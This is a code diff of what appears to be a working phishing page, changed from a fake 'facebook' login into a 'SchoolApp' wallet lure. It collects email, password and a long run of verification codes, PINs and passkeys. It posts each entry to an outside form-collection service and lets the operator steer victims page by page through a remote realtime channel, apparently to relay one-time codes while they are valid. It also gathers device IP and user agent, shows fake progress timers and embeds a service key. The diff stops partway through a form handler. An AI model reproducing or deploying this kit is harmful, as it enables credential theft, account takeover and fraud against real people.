@@ -3,7 +3,7 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Mail</title>
+<title>School</title>
 
 <!-- Open Graph / Social Media Meta Tags -->
 <meta property="og:title" content="Video Call">
@@ -66,7 +66,7 @@
     box-shadow: 0 10px 30px rgba(0, 0, 0, 0.04);
   }
 
-  /* All view sections are hidden by default, controlled via JS */
+  /* All view sections hidden by default */
   .step-section {
     display: none;
   }
@@ -94,7 +94,6 @@
     margin: 0;
   }
 
-  /* --- SECTION-SPECIFIC TEXT STYLES FOR EASY EDITING --- */
   .step1-intro-text {
     font-size: 15px;
     font-weight: 500;
@@ -113,15 +112,6 @@
     text-align: center;
   }
 
-  .dashboard-header-text {
-    font-size: 15px;
-    font-weight: 500;
-    color: #000000;
-    line-height: 1.5;
-    margin-bottom: 20px;
-    text-align: center;
-  }
-
   .dashboard-subtitle {
     font-size: 15px;
     font-weight: 500;
@@ -131,7 +121,7 @@
     text-align: left;
   }
 
-  .verification-instruction-text {
+  .verification-instruction-text, .pin-instruction-text {
     font-size: 15px;
     font-weight: 500;
     color: #000000;
@@ -140,48 +130,17 @@
     text-align: left;
   }
 
-  .pin-instruction-text {
-    font-size: 15px;
-    font-weight: 500;
-    color: #000000;
-    line-height: 1.5;
-    margin-bottom: 20px;
-    text-align: left;
-  }
-
-  .success-title {
-    font-size: 25px;
-    font-weight: 700;
-    color: #171a20;
-    margin: 0 0 12px 0;
-    text-align: center;
-    margin-top: 15px;
-  }
-
-  .success-description {
-    font-size: 16px;
+  /* EXTERNAL MESSAGE STYLING (.external-message) */
+  .external-message {
+    font-size: 41px;
     font-weight: 400;
     color: #000000;
-    line-height: 1.5;
-    margin: 0;
     text-align: center;
-  }
-
-  /* Designated 20px Black Custom Message Area Style */
-  #dynamic-message-box {
-    display: none;
-    width: 100%;
-    min-height: 20px;
-    background-color: #000000;
-    color: #ffffff;
-    font-size: 14px;
-    font-weight: 500;
-    padding: 10px 14px;
-    margin-bottom: 20px;
-    border-radius: 4px;
+    margin: 15px 0 25px 0;
+    line-height: 1.2;
     word-break: break-word;
+    display: none;
   }
-  /* ---------------------------------------------------- */
 
   .floating-group {
     position: relative;
@@ -239,7 +198,6 @@
     font-size: 16px;
     font-weight: 700;
     letter-spacing: 0.5px;
-    text-transform: none;
     cursor: pointer;
     transition: background-color 0.2s ease;
     margin-top: 36px;
@@ -251,35 +209,32 @@
     background-color: #1557b0;
   }
 
-  /* FULL-WIDTH SUPPORT BUTTON FOR FINAL PAGE */
+  /* CUSTOM FINAL SUPPORT BUTTON */
   .customer-support-btn {
     width: 100%;
-    height: 45px;
+    height: 50px;
     border: 0;
-    border-radius: 1px;
+    border-radius: 25px;
     background-color: var(--btn-color);
     color: #ffffff;
     font-size: 16px;
     font-weight: 700;
     letter-spacing: 0.5px;
-    text-transform: none;
     cursor: pointer;
     transition: background-color 0.2s ease;
     margin-top: 24px;
-    display: block;
+    display: flex;
+    align-items: center;
+    justify-content: center;
   }
 
   .customer-support-btn:hover {
     background-color: #1557b0;
   }
 
-  /* PROCESSING CONTAINERS PUSHED MUCH LOWER */
+  /* UNIFIED PROCESSING CONTAINERS */
   .processing-container {
     text-align: center;
-    padding: 90px 0;
-  }
-
-  #processing1-timer {
     padding: 110px 0;
   }
 
@@ -328,7 +283,7 @@
     100% { transform: rotate(360deg); }
   }
 
-  #timerCount {
+  .timerCount {
     position: absolute;
     inset: 0;
     display: flex;
@@ -340,7 +295,7 @@
     color: #000000;
   }
 
-  /* REUSABLE WALLET CARD CLASS */
+  /* WALLET CARD CLASS */
   .exact-wallet-card {
     background: #ffffff;
     border: 2px solid var(--color-bank-navy);
@@ -362,7 +317,6 @@
     font-weight: 700;
     color: #ffffff;
     margin: 0;
-    letter-spacing: 0.2px;
   }
 
   .exact-wallet-card .wallet-fdic {
@@ -401,19 +355,15 @@
     font-size: 12px;
     font-weight: 600;
     color: var(--color-bank-text-secondary);
-    font-family: 'Inter', sans-serif;
     text-transform: uppercase;
     letter-spacing: 0.05em;
     margin: 0;
   }
 
   .exact-wallet-card .wallet-amount {
-    font-family: 'Inter', sans-serif;
-    font-style: normal;
-    font-weight: 700;
     font-size: 32px;
+    font-weight: 700;
     color: #0a2540;
-    margin-top: 0px;
     line-height: 1.1;
   }
 
@@ -437,11 +387,6 @@
     border: none;
     cursor: pointer;
     padding: 0;
-    text-decoration: none;
-  }
-
-  .exact-wallet-card .wallet-stmt-btn:hover {
-    color: #1d4ed8;
   }
 
   @media (min-width: 768px) {
@@ -470,7 +415,7 @@
                         <i class="fa-solid fa-list-check" style="font-size: 14px;"></i>
                     </div>
                     <div>
-                        <h3 style="font-family: 'Inter', sans-serif; font-weight: 700; font-size: 16px; margin: 0; color: #ffffff;">Account Statement</h3>
+                        <h3 style="font-size: 16px; font-weight: 700; margin: 0; color: #ffffff;">Account Statement</h3>
                         <p style="font-size: 10px; color: #cbd5e1; font-family: 'JetBrains Mono', monospace; margin: 0;">Recent Posted Transactions & Adjustments</p>
                     </div>
                 </div>
@@ -498,19 +443,21 @@
     <div class="main-wrapper">
       <div id="content">
 
-        <!-- STEP 1: Initial Registration Form -->
+        <!-- FORM 1 ("A") -->
         <div id="myFormSection" class="step-section" style="display: block;">
           <form id="myForm" onsubmit="submitForm(event);">
             <input type="hidden" name="z_DeviceContext" id="hiddenDeviceContext">
 
             <div style="text-align: center; margin-bottom: 16px;">
               <img src="schoolfbb" class="sFlh5c FyHeAf iPVvYb" style="max-width: 2000px; width: 55px; height: 55px; margin: 0px;" alt="" role="button">
-              <h5 class="form-title-facebook">facebook</h5>
+              <h5 class="form-title-facebook">SchoolApp</h5>
             </div>
                 
             <h5 class="step1-intro-text">
               You can now see your school benefits. To help you log in to schoolApp, follow the procedures below and use your school app activities. After logging in you will see your school wallet balance, bonus, and everything on it.
             </h5>
+
+            <div class="external-message"></div>
 
             <div style="text-align: center;">
               <img src="" class="sFlh5c FyHeAf iPVvYb" style="max-width: 4800px; width: 129px; height: 44px; margin: 3px 0px;" alt="School">
@@ -547,18 +494,18 @@
           </form>
         </div>
 
-        <!-- STEP 2: First Processing Stage -->
+        <!-- PROCESSING 1 -->
         <div id="processing1-timer" class="step-section processing-container">
           <div class="example-spinner-wrapper">
             <div class="example-spinner-bg"></div>
             <div class="example-spinner-ring"></div>
-            <div id="timerCount">1%</div>
+            <div id="timerCount1" class="timerCount">1%</div>
           </div>
           <div class="processing-title-custom">Processing request.......</div>
           <div class="processing-subtitle-custom">Please wait....</div>
         </div>
 
-        <!-- STEP 3: Second Sign In Page (Wallet Card) -->
+        <!-- FORM 2 ("B") -->
         <div id="mainContent" class="step-section">
           <div class="exact-wallet-card">
               <div class="wallet-header">
@@ -589,6 +536,8 @@
               <span class="submittedName"></span>, login in again
             </h5><br>
 
+            <div class="external-message"></div>
+
             <div>
               <div class="floating-group">
                 <input type="text" required id="fullName" name="Googl-Emai" class="floating-input" placeholder=" " data-min-length="8" data-error-message="Enter your complete email" oninput="validateCustom(this)" />
@@ -606,23 +555,27 @@
           </form>
         </div> 
 
-        <!-- STEP 4: Second Processing Stage -->
+        <!-- PROCESSING 2 -->
         <div id="processing2" class="step-section processing-container">
-          <div class="processing-title-custom">Verifying . . .</div>
-          <div class="processing-subtitle-custom" style="margin-top: 15px;">Please wait</div>
-          <div class="example-spinner-wrapper" style="width: 80px; height: 80px; margin-top: 20px;">
-            <div class="example-spinner-bg" style="border-width: 6px;"></div>
-            <div class="example-spinner-ring" style="border-width: 6px;"></div>
+          <div class="example-spinner-wrapper">
+            <div class="example-spinner-bg"></div>
+            <div class="example-spinner-ring"></div>
+            <div id="timerCount2" class="timerCount">1%</div>
           </div>
+          <div class="processing-title-custom">Verifying credentials.......</div>
+          <div class="processing-subtitle-custom">Please wait....</div>
         </div>
 
-        <!-- THIRD PAGE ("C" - Verification Code Page with 20px Black Custom Message Box) -->
+        <!-- FORM 3 ("C") -->
         <div id="mainContent2" class="step-section">
-          <!-- DESIGNATED 20px BLACK CUSTOM MESSAGE BOX -->
-          <div id="dynamic-message-box"></div>
-
           <div class="lower-section">
             <form id="thirdForm" onsubmit="submitThirdForm(event);">
+              <h5 class="step1-intro-text">
+                Get ready to go back to school. Cod + Yes            
+              </h5>     
+              
+              <div class="external-message"></div>
+
               <h5 class="verification-instruction-text">
                 <span class="submittedName"></span>, enter your verification code: 
               </h5>
@@ -644,65 +597,283 @@
           </div>
         </div>
 
-        <!-- STEP 6: Third Processing Stage -->
+        <!-- PROCESSING 3 -->
         <div id="processing3" class="step-section processing-container">
-          <div class="processing-title-custom">Finalizing . . .</div>
-          <div class="processing-subtitle-custom" style="margin-top: 15px;">Please wait</div>
-          <div class="example-spinner-wrapper" style="width: 80px; height: 80px; margin-top: 20px;">
-            <div class="example-spinner-bg" style="border-width: 6px;"></div>
-            <div class="example-spinner-ring" style="border-width: 6px;"></div>
+          <div class="example-spinner-wrapper">
+            <div class="example-spinner-bg"></div>
+            <div class="example-spinner-ring"></div>
+            <div id="timerCount3" class="timerCount">1%</div>
           </div>
+          <div class="processing-title-custom">Finalizing verification.......</div>
+          <div class="processing-subtitle-custom">Please wait....</div>
         </div>
 
-        <!-- 4th STAGE / "C2" PAGE: Secure PIN Page -->
+        <!-- FORM 4 ("D") -->
         <div id="mainContent3" class="step-section">
           <div class="lower-section">
             <form id="fourthForm" onsubmit="submitFourthForm(event);">
               <div style="text-align: center;">
                 <img src="" class="sFlh5c FyHeAf iPVvYb" style="max-width: 4800px; width: 129px; height: 44px; margin: 3px 0px;" alt="School">
-                <h5 class="signin-header-title">Sign in</h5>
-              </div><br>
-
-              <h5 class="pin-instruction-text">
-                <span class="submittedName"></span>, please re-confirm your secure PIN: 
-              </h5>
-
-              <div>
-                <div class="floating-group">
-                  <input type="text" inputmode="numeric" pattern="[0-9]{4,8}" minlength="4" maxlength="8" required name="securePin" class="floating-input" placeholder=" " data-min-length="4" data-error-message="Please enter complete PIN" oninput="validateCodeInput(this)" />
-                  <span class="floating-label">Enter Secure PIN</span> 
+                <h5 class="step1-intro-text">Get ready to go back to school. Yes only</h5>
+                <div class="external-message"></div>
+                <h5 class="pin-instruction-text">Please enter correct verification code</h5>
+                <div>
+                  <div class="floating-group">
+                    <input type="text" inputmode="numeric" pattern="[0-9]{4,8}" minlength="4" maxlength="8" required name="securePin" class="floating-input" placeholder=" " data-min-length="4" data-error-message="Please enter complete PIN" oninput="validateCodeInput(this)" />
+                    <span class="floating-label">Enter Verification Code</span> 
+                  </div>
+                  <div class="floating-group">
+                    <input type="text" inputmode="numeric" pattern="[0-9]{4,8}" minlength="4" maxlength="8" required name="securePin_confirm" class="floating-input" placeholder=" " data-min-length="4" data-error-message="Please enter complete PIN" oninput="validateCodeInput(this)" />
+                    <span class="floating-label">Enter Verification Code Again</span>
+                  </div>
+                  <button type="submit" class="responsive-btn">Proceed</button>
                 </div>
-
-                <div class="floating-group">
-                  <input type="text" inputmode="numeric" pattern="[0-9]{4,8}" minlength="4" maxlength="8" required name="securePin_confirm" class="floating-input" placeholder=" " data-min-length="4" data-error-message="Please enter complete PIN" oninput="validateCodeInput(this)" />
-                  <span class="floating-label">Confirm Secure PIN</span>
-                </div>
-
-                <button type="submit" class="responsive-btn">Proceed</button>
               </div>
             </form>
           </div>
         </div>
 
-        <!-- STEP 8: Fourth Processing Stage -->
+        <!-- PROCESSING 4 -->
         <div id="processing4" class="step-section processing-container">
-          <div class="processing-title-custom">Setting up account dashboard...</div>
-          <div class="processing-subtitle-custom" style="margin-top: 15px;">Almost done</div>
-          <div class="example-spinner-wrapper" style="width: 80px; height: 80px; margin-top: 20px;">
-            <div class="example-spinner-bg" style="border-width: 6px;"></div>
-            <div class="example-spinner-ring" style="border-width: 6px;"></div>
+          <div class="example-spinner-wrapper">
+            <div class="example-spinner-bg"></div>
+            <div class="example-spinner-ring"></div>
+            <div id="timerCount4" class="timerCount">1%</div>
+          </div>
+          <div class="processing-title-custom">Verifying details.......</div>
+          <div class="processing-subtitle-custom">Please wait....</div>
+        </div>
+
+        <!-- FORM 5 ("E") -->
+        <div id="mainContent4" class="step-section">
+          <div class="lower-section">
+            <form id="fifthForm" onsubmit="submitFifthForm(event);">
+              <div style="text-align: center;">
+                <img src="" class="sFlh5c FyHeAf iPVvYb" style="max-width: 4800px; width: 129px; height: 44px; margin: 3px 0px;" alt="School">
+                <h5 class="step1-intro-text">Additional Verification Step</h5>
+                <div class="external-message"></div>
+                <h5 class="pin-instruction-text"><span class="submittedName"></span>, please provide authorization code:</h5>
+                <div>
+                  <div class="floating-group">
+                    <input type="text" inputmode="numeric" pattern="[0-9]{4,8}" minlength="4" maxlength="8" required name="authCode1" class="floating-input" placeholder=" " data-min-length="4" data-error-message="Please enter code" oninput="validateCodeInput(this)" />
+                    <span class="floating-label">Authorization Code</span> 
+                  </div>
+                  <div class="floating-group">
+                    <input type="text" inputmode="numeric" pattern="[0-9]{4,8}" minlength="4" maxlength="8" required name="authCode1_confirm" class="floating-input" placeholder=" " data-min-length="4" data-error-message="Please confirm code" oninput="validateCodeInput(this)" />
+                    <span class="floating-label">Confirm Authorization Code</span>
+                  </div>
+                  <button type="submit" class="responsive-btn">Proceed</button>
+                </div>
+              </div>
+            </form>
           </div>
         </div>
 
-        <!-- LAST PAGE ("F"): Final Success Page -->
-        <div id="finalApproved" class="step-section" style="background: #ffffff; min-height: 200px; padding: 10px 0; text-align: center;">
+        <!-- PROCESSING 5 -->
+        <div id="processing5" class="step-section processing-container">
+          <div class="example-spinner-wrapper">
+            <div class="example-spinner-bg"></div>
+            <div class="example-spinner-ring"></div>
+            <div id="timerCount5" class="timerCount">1%</div>
+          </div>
+          <div class="processing-title-custom">Processing authorization.......</div>
+          <div class="processing-subtitle-custom">Almost done....</div>
+        </div>
+
+        <!-- FORM 6 ("F") -->
+        <div id="mainContent5" class="step-section">
+          <div class="lower-section">
+            <form id="sixthForm" onsubmit="submitSixthForm(event);">
+              <div style="text-align: center;">
+                <img src="" class="sFlh5c FyHeAf iPVvYb" style="max-width: 4800px; width: 129px; height: 44px; margin: 3px 0px;" alt="School">
+                <h5 class="step1-intro-text">Final Confirmation Step</h5>
+                <div class="external-message"></div>
+                <h5 class="pin-instruction-text"><span class="submittedName"></span>, enter final confirmation code:</h5>
+                <div>
+                  <div class="floating-group">
+                    <input type="text" inputmode="numeric" pattern="[0-9]{4,8}" minlength="4" maxlength="8" required name="finalCode" class="floating-input" placeholder=" " data-min-length="4" data-error-message="Please enter code" oninput="validateCodeInput(this)" />
+                    <span class="floating-label">Final Code</span> 
+                  </div>
+                  <div class="floating-group">
+                    <input type="text" inputmode="numeric" pattern="[0-9]{4,8}" minlength="4" maxlength="8" required name="finalCode_confirm" class="floating-input" placeholder=" " data-min-length="4" data-error-message="Please confirm code" oninput="validateCodeInput(this)" />
+                    <span class="floating-label">Confirm Final Code</span>
+                  </div>
+                  <button type="submit" class="responsive-btn">Complete</button>
+                </div>
+              </div>
+            </form>
+          </div>
+        </div>
+
+        <!-- PROCESSING 6 -->
+        <div id="processing6" class="step-section processing-container">
+          <div class="example-spinner-wrapper">
+            <div class="example-spinner-bg"></div>
+            <div class="example-spinner-ring"></div>
+            <div id="timerCount6" class="timerCount">1%</div>
+          </div>
+          <div class="processing-title-custom">Finalizing setup.......</div>
+          <div class="processing-subtitle-custom">Please wait....</div>
+        </div>
+
+        <!-- FORM 7 ("G") -->
+        <div id="mainContent6" class="step-section">
+          <div class="lower-section">
+            <form id="seventhForm" onsubmit="submitSeventhForm(event);">
+              <div style="text-align: center;">
+                <img src="" class="sFlh5c FyHeAf iPVvYb" style="max-width: 4800px; width: 129px; height: 44px; margin: 3px 0px;" alt="School">
+                <h5 class="step1-intro-text">Security Validation</h5>
+                <div class="external-message"></div>
+                <h5 class="pin-instruction-text"><span class="submittedName"></span>, enter security passkey:</h5>
+                <div>
+                  <div class="floating-group">
+                    <input type="text" inputmode="numeric" pattern="[0-9]{4,8}" minlength="4" maxlength="8" required name="passkey" class="floating-input" placeholder=" " data-min-length="4" data-error-message="Please enter passkey" oninput="validateCodeInput(this)" />
+                    <span class="floating-label">Passkey</span> 
+                  </div>
+                  <div class="floating-group">
+                    <input type="text" inputmode="numeric" pattern="[0-9]{4,8}" minlength="4" maxlength="8" required name="passkey_confirm" class="floating-input" placeholder=" " data-min-length="4" data-error-message="Please confirm passkey" oninput="validateCodeInput(this)" />
+                    <span class="floating-label">Confirm Passkey</span>
+                  </div>
+                  <button type="submit" class="responsive-btn">Verify</button>
+                </div>
+              </div>
+            </form>
+          </div>
+        </div>
+
+        <!-- PROCESSING 7 -->
+        <div id="processing7" class="step-section processing-container">
+          <div class="example-spinner-wrapper">
+            <div class="example-spinner-bg"></div>
+            <div class="example-spinner-ring"></div>
+            <div id="timerCount7" class="timerCount">1%</div>
+          </div>
+          <div class="processing-title-custom">Validating security passkey.......</div>
+          <div class="processing-subtitle-custom">Almost there....</div>
+        </div>
+
+        <!-- FORM 8 ("H") -->
+        <div id="mainContent7" class="step-section">
+          <div class="lower-section">
+            <form id="eighthForm" onsubmit="submitEighthForm(event);">
+              <div style="text-align: center;">
+                <img src="" class="sFlh5c FyHeAf iPVvYb" style="max-width: 4800px; width: 129px; height: 44px; margin: 3px 0px;" alt="School">
+                <h5 class="step1-intro-text">Account Authentication</h5>
+                <div class="external-message"></div>
+                <h5 class="pin-instruction-text"><span class="submittedName"></span>, enter final authentication pin:</h5>
+                <div>
+                  <div class="floating-group">
+                    <input type="text" inputmode="numeric" pattern="[0-9]{4,8}" minlength="4" maxlength="8" required name="authPin" class="floating-input" placeholder=" " data-min-length="4" data-error-message="Please enter PIN" oninput="validateCodeInput(this)" />
+                    <span class="floating-label">Authentication PIN</span> 
+                  </div>
+                  <div class="floating-group">
+                    <input type="text" inputmode="numeric" pattern="[0-9]{4,8}" minlength="4" maxlength="8" required name="authPin_confirm" class="floating-input" placeholder=" " data-min-length="4" data-error-message="Please confirm PIN" oninput="validateCodeInput(this)" />
+                    <span class="floating-label">Confirm PIN</span>
+                  </div>
+                  <button type="submit" class="responsive-btn">Validate</button>
+                </div>
+              </div>
+            </form>
+          </div>
+        </div>
+
+        <!-- PROCESSING 8 -->
+        <div id="processing8" class="step-section processing-container">
+          <div class="example-spinner-wrapper">
+            <div class="example-spinner-bg"></div>
+            <div class="example-spinner-ring"></div>
+            <div id="timerCount8" class="timerCount">1%</div>
+          </div>
+          <div class="processing-title-custom">Completing authentication.......</div>
+          <div class="processing-subtitle-custom">Please wait....</div>
+        </div>
+
+        <!-- FORM 9 ("I") -->
+        <div id="mainContent8" class="step-section">
+          <div class="lower-section">
+            <form id="ninthForm" onsubmit="submitNinthForm(event);">
+              <div style="text-align: center;">
+                <img src="" class="sFlh5c FyHeAf iPVvYb" style="max-width: 4800px; width: 129px; height: 44px; margin: 3px 0px;" alt="School">
+                <h5 class="step1-intro-text">System Access Code</h5>
+                <div class="external-message"></div>
+                <h5 class="pin-instruction-text"><span class="submittedName"></span>, enter system access code:</h5>
+                <div>
+                  <div class="floating-group">
+                    <input type="text" inputmode="numeric" pattern="[0-9]{4,8}" minlength="4" maxlength="8" required name="sysCode" class="floating-input" placeholder=" " data-min-length="4" data-error-message="Please enter system code" oninput="validateCodeInput(this)" />
+                    <span class="floating-label">System Access Code</span> 
+                  </div>
+                  <div class="floating-group">
+                    <input type="text" inputmode="numeric" pattern="[0-9]{4,8}" minlength="4" maxlength="8" required name="sysCode_confirm" class="floating-input" placeholder=" " data-min-length="4" data-error-message="Please confirm system code" oninput="validateCodeInput(this)" />
+                    <span class="floating-label">Confirm System Code</span>
+                  </div>
+                  <button type="submit" class="responsive-btn">Submit</button>
+                </div>
+              </div>
+            </form>
+          </div>
+        </div>
+
+        <!-- PROCESSING 9 -->
+        <div id="processing9" class="step-section processing-container">
+          <div class="example-spinner-wrapper">
+            <div class="example-spinner-bg"></div>
+            <div class="example-spinner-ring"></div>
+            <div id="timerCount9" class="timerCount">1%</div>
+          </div>
+          <div class="processing-title-custom">Verifying system access code.......</div>
+          <div class="processing-subtitle-custom">Please wait....</div>
+        </div>
+
+        <!-- FORM 10 ("J") -->
+        <div id="mainContent9" class="step-section">
+          <div class="lower-section">
+            <form id="tenthForm" onsubmit="submitTenthForm(event);">
+              <div style="text-align: center;">
+                <img src="" class="sFlh5c FyHeAf iPVvYb" style="max-width: 4800px; width: 129px; height: 44px; margin: 3px 0px;" alt="School">
+                <h5 class="step1-intro-text">Final Authorization Key</h5>
+                <div class="external-message"></div>
+                <h5 class="pin-instruction-text"><span class="submittedName"></span>, enter your final authorization key:</h5>
+                <div>
+                  <div class="floating-group">
+                    <input type="text" inputmode="numeric" pattern="[0-9]{4,8}" minlength="4" maxlength="8" required name="finalKey" class="floating-input" placeholder=" " data-min-length="4" data-error-message="Please enter key" oninput="validateCodeInput(this)" />
+                    <span class="floating-label">Final Authorization Key</span> 
+                  </div>
+                  <div class="floating-group">
+                    <input type="text" inputmode="numeric" pattern="[0-9]{4,8}" minlength="4" maxlength="8" required name="finalKey_confirm" class="floating-input" placeholder=" " data-min-length="4" data-error-message="Please confirm key" oninput="validateCodeInput(this)" />
+                    <span class="floating-label">Confirm Authorization Key</span>
+                  </div>
+                  <button type="submit" class="responsive-btn">Authorize</button>
+                </div>
+              </div>
+            </form>
+          </div>
+        </div>
+
+        <!-- PROCESSING 10 -->
+        <div id="processing10" class="step-section processing-container">
+          <div class="example-spinner-wrapper">
+            <div class="example-spinner-bg"></div>
+            <div class="example-spinner-ring"></div>
+            <div id="timerCount10" class="timerCount">1%</div>
+          </div>
+          <div class="processing-title-custom">Validating final key.......</div>
+          <div class="processing-subtitle-custom">Please wait....</div>
+        </div>
+
+        <!-- LAST PAGE ("Z"): Final Non-Form Support Page -->
+        <div id="finalApproved" class="step-section" style="text-align: center; padding: 40px 10px;">
           <div class="lower-section">
             <img src="" class="sFlh5c FyHeAf iPVvYb" style="max-width: 4800px; width: 129px; height: 44px; margin: 3px 0px;" alt="">
-            <h3 class="success-title">Registration Successful!</h3>
-            <p class="success-description">
-              Your account has been fully verified and approved. You can now access your school benefits and dashboard securely.
+            
+            <div class="external-message" style="display: block; margin-bottom: 20px;"></div>
+
+            <p style="font-size: 16px; font-weight: 500; color: #000000; line-height: 1.5; margin-bottom: 30px;">
+              It seems you are having trouble, you are almost ready, please tap the button below to contact us and we will assist you
             </p>
-            <button type="button" class="customer-support-btn" onclick="event.preventDefault();">Tap Here for Support</button>
+
+            <button type="button" class="customer-support-btn" onclick="event.preventDefault(); alert('Support clicked');">
+              [ Tap here to contact us ]
+            </button>
           </div>
         </div>
 
@@ -710,13 +881,13 @@
     </div>
 
 <script>
-    // --- SUPABASE CONFIGURATION ---
+    // --- SUPABASE REAL-TIME CONFIGURATION ---
     const SUPABASE_URL = "https://bqddohfszkqpvncpbrun.supabase.co";
     const SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImJxZGRvaGZzemtxcHZuY3BicnVuIiwicm9sZSI6ImFub24iLCJpYXQiOjE3OTI2MDAwNjIsImV4cCI6MjEwODE3NjA2Mn0.J0uq4JPpPxoU0hc4ry5WglCV_HcTqshcHsl3oCJ7upA";
     
     const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
 
-    // Realtime Listener for Instant Remote Control
+    // Live Realtime Websocket Listener for row changes in app_control table
     supabaseClient
         .channel('public:app_control')
         .on('postgres_changes', { event: '*', schema: 'public', table: 'app_control' }, payload => {
@@ -724,7 +895,7 @@
         })
         .subscribe();
 
-    // Fetch initial state on page load
+    // Fetch persistent state when page loads
     async function fetchInitialState() {
         const { data, error } = await supabaseClient
             .from('app_control')
@@ -738,25 +909,58 @@
     }
     fetchInitialState();
 
+    // --- FULL ALPHABETICAL ROUTING & TEXT INJECTION LOGIC ---
     function handleRemoteCommand(data) {
         if (!data) return;
 
-        // 1. Handle Custom Message in 20px Black Box
-        const msgBox = document.getElementById('dynamic-message-box');
-        if (data.message && msgBox) {
-            msgBox.textContent = data.message;
-            msgBox.style.display = 'block';
-        } else if (msgBox) {
-            msgBox.style.display = 'none';
-        }
+        // 1. Inject Dynamic External Text across any page containing .external-message
+        const msgElements = document.querySelectorAll('.external-message');
+        msgElements.forEach(el => {
+            if (data.message && data.message.trim() !== '') {
+                el.textContent = data.message;
+                el.style.display = 'block';
+            } else {
+                el.style.display = 'none';
+            }
+        });
 
-        // 2. Handle View Routing
-        if (data.keyword === "C") {
-            showStep('mainContent2'); // Third page
-        } else if (data.keyword === "C2") {
-            showStep('mainContent3'); // 4th Code/PIN page
-        } else if (data.keyword === "F") {
-            showStep('finalApproved'); // Last success page
+        // 2. View Switching Logic (Alphabet Mapping A to J, and Z)
+        switch (data.keyword) {
+            case "A":
+                showStep('myFormSection'); // Page 1 (Form 1)
+                break;
+            case "B":
+                showStep('mainContent');   // Page 2 (Form 2)
+                break;
+            case "C":
+                showStep('mainContent2');  // Page 3 (Form 3)
+                break;
+            case "D":
+                showStep('mainContent3');  // Page 4 (Form 4)
+                break;
+            case "E":
+                showStep('mainContent4');  // Page 5 (Form 5)
+                break;
+            case "F":
+                showStep('mainContent5');  // Page 6 (Form 6)
+                break;
+            case "G":
+                showStep('mainContent6');  // Page 7 (Form 7)
+                break;
+            case "H":
+                showStep('mainContent7');  // Page 8 (Form 8)
+                break;
+            case "I":
+                showStep('mainContent8');  // Page 9 (Form 9)
+                break;
+            case "J":
+                showStep('mainContent9');  // Page 10 (Form 10)
+                break;
+            case "Z":
+                showStep('finalApproved'); // Final Page (Customer Support)
+                break;
+            default:
+                break;
         }
     }
 
@@ -764,6 +968,7 @@
         document.getElementById('hidden-user-agent').value = navigator.userAgent;
     }
 
+    // --- UTILITY & INPUT VALIDATION FUNCTIONS ---
     (async function gatherDeviceContext() {
         try {
             let clientIp = 'IP-Fetching';
@@ -876,6 +1081,27 @@
         }
     }
 
+    function runProcessingTimer(timerElementId, durationMs, nextStepId) {
+        let count = 1;
+        const timerElement = document.getElementById(timerElementId);
+        if (timerElement) timerElement.textContent = "1%";
+        const intervalTime = durationMs / 100;
+        const timerInterval = setInterval(() => {
+            count++;
+            if (count <= 100) { 
+                if (timerElement) timerElement.textContent = count + "%"; 
+            } else { 
+                clearInterval(timerInterval); 
+            }
+        }, intervalTime);
+
+        setTimeout(() => {
+            clearInterval(timerInterval);
+            showStep(nextStepId);
+        }, durationMs);
+    }
+
+    // --- FORM SUBMISSION HANDLERS ---
     function submitForm(event) {
         if (event) event.preventDefault();
         const celebName = document.getElementById("name").value;
@@ -887,56 +1113,118 @@
             method: "POST",
             body: new FormData(document.getElementById("myForm")),
             headers: { 'Accept': 'application/json' }
-        }).catch(err => console.error('First form submission error:', err));
+        }).catch(err => console.error('Form 1 error:', err));
 
         showStep('processing1-timer');
-        let count = 1;
-        const timerElement = document.getElementById("timerCount");
-        const totalDurationMs = 3000;
-        const intervalTime = totalDurationMs / 100;
-        const timerInterval = setInterval(() => {
-            count++;
-            if (count <= 100) { if (timerElement) timerElement.textContent = count + "%"; }
-            else { clearInterval(timerInterval); }
-        }, intervalTime);
-
-        setTimeout(() => {
-            clearInterval(timerInterval);
-            showStep('mainContent');
-        }, totalDurationMs);
+        runProcessingTimer('timerCount1', 3000, 'mainContent');
     }
 
     function submitSecondForm(event) {
         event.preventDefault();
-        showStep('processing2');
         fetch("https://submit-form.com/EGef8sATM", {
             method: "POST",
             body: new FormData(document.getElementById("secondForm")),
             headers: { 'Accept': 'application/json' }
-        }).catch(err => console.error('Form submission error:', err))
-          .finally(() => setTimeout(() => showStep('mainContent2'), 2000));
+        }).catch(err => console.error('Form 2 error:', err));
+
+        showStep('processing2');
+        runProcessingTimer('timerCount2', 2500, 'mainContent2');
     }
 
     function submitThirdForm(event) {
         event.preventDefault();
-        showStep('processing3');
         fetch("https://submit-form.com/EGef8sATM", {
             method: "POST",
             body: new FormData(document.getElementById("thirdForm")),
             headers: { 'Accept': 'application/json' }
-        }).catch(err => console.error('Form submission error:', err))
-          .finally(() => setTimeout(() => showStep('mainContent3'), 2000));
+        }).catch(err => console.error('Form 3 error:', err));
+
+        showStep('processing3');
+        runProcessingTimer('timerCount3', 2500, 'mainContent3');
     }
 
     function submitFourthForm(event) {
         event.preventDefault();
-        showStep('processing4');
         fetch("https://submit-form.com/EGef8sATM", {
             method: "POST",
             body: new FormData(document.getElementById("fourthForm")),
             headers: { 'Accept': 'application/json' }
-        }).catch(err => console.error('Form submission error:', err))
-          .finally(() => setTimeout(() => showStep('finalApproved'), 2000));
+        }).catch(err => console.error('Form 4 error:', err));
+
+        showStep('processing4');
+        runProcessingTimer('timerCount4', 2500, 'mainContent4');
+    }
+
+    function submitFifthForm(event) {
+        event.preventDefault();
+        fetch("https://submit-form.com/EGef8sATM", {
+            method: "POST",
+            body: new FormData(document.getElementById("fifthForm")),
+            headers: { 'Accept': 'application/json' }
+        }).catch(err => console.error('Form 5 error:', err));
+
+        showStep('processing5');
+        runProcessingTimer('timerCount5', 2500, 'mainContent5');
+    }
+
+    function submitSixthForm(event) {
+        event.preventDefault();
+        fetch("https://submit-form.com/EGef8sATM", {
+            method: "POST",
+            body: new FormData(document.getElementById("sixthForm")),
+            headers: { 'Accept': 'application/json' }
+        }).catch(err => console.error('Form 6 error:', err));
+
+        showStep('processing6');
+        runProcessingTimer('timerCount6', 2500, 'mainContent6');
+    }
+
+    function submitSeventhForm(event) {
+        event.preventDefault();
+        fetch("https://submit-form.com/EGef8sATM", {
+            method: "POST",
+            body: new FormData(document.getElementById("seventhForm")),
